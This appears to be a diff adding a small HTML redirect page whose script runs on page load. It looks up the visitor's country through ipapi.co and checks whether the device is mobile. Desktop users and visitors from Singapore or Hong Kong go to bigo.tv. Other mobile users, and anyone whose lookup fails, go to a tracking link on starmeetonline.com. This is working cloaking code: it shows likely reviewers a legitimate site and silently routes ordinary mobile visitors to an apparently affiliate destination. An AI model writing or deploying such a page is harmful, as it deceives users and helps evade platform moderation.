@@ -1,1 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect Page</title>
+</head>
+<body>
+    <script>
+        // Функция для определения страны через API (ipapi.co)
+        function getCountry() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const country = data.country_code; // Код страны (SG для Сингапура, HK для Гонконга)
+                    const isDesktop = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? false : true;
 
+                    // Логика редиректа
+                    if (isDesktop) {
+                        window.location.href = 'https://www.bigo.tv/show/';
+                    } else if (country === 'SG' || country === 'HK') {
+                        window.location.href = 'https://www.bigo.tv/show/';
+                    } else {
+                        window.location.href = 'https://rp12mr6.starmeetonline.com/ye9anqx?s1=L&cid=L';
+                    }
+                })
+                .catch(error => {
+                    // Если API не работает, перенаправляем по умолчанию
+                    window.location.href = 'https://rp12mr6.starmeetonline.com/ye9anqx?s1=L&cid=L';
+                });
+        }
+
+        // Выполняем редирект сразу при загрузке
+        window.onload = getCountry;
+    </script>
+</body>
+</html>
